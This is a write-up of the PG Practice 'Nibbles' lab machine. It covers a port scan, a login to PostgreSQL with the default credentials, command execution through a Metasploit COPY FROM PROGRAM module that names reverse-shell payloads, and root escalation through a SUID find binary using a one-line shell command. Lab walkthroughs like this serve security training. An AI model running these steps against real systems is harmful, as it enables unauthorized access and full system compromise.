---
description: PG Practice Nibbles writeup
---

# Nibbles

## Nmap

```
sudo nmap   192.168.51.47 -p- -sS -sV          

PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 5437 is running postgresql version between 11.3 - 11.7. I was able to login with the default credentials of `postgres:postgres` using `psql`.

```
 psql -h 192.168.51.47 -U postgres -p 5437
```

![](<../../../.gitbook/assets/image (859).png>)

As we are running on a version of postgresql higher than 9.3 we should be able to use the following exploit to gain command execution on the target machine.

{% embed url="https://www.exploit-db.com/exploits/46813" %}

**Description**

_Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with 'pg\_execute\_server\_program' to pipe to and from an external program using COPY. This allows arbitrary command execution as though you have console access._

_This module attempts to create a new table, then execute system commands in the context of copying the command output into the table._

_This module should work on all Postgres systems running version 9.3 and above._

_For Linux & OSX systems, target 1 is used with cmd payloads such as: cmd/unix/reverse\_perl_

_For Windows Systems, target 2 is used with Powershell payloads such as: cmd/windows/powershell\_reverse\_tcp Alternativly target 3 can be used to execute generic commands, such as a web\_delivery meterpreter powershell payload or other customized command._

First ensure we are a superuser on postgresql:

```
SELECT current_setting('is_superuser');
```

![](<../../../.gitbook/assets/image (860).png>)

As we are confirmed a superuser we can use the following `Metasploit` module to gain a shell.

```
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

![](<../../../.gitbook/assets/image (861).png>)

Execution:

![](<../../../.gitbook/assets/image (862).png>)

Checking for SUID and PATH we have a '.' at the end of path and SUID bit set for the find `binary`.

![](<../../../.gitbook/assets/image (863).png>)

Knowing this we can attempt to gain privileges by exploiting the find binary. Checking [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) shows we can escalate privileges:

![https://gtfobins.github.io/gtfobins/find/](<../../../.gitbook/assets/image (864).png>)

Running the following will escalate privileges:

```
find . -exec /bin/sh -p \; -quit
```

![](<../../../.gitbook/assets/image (865) (1).png>)
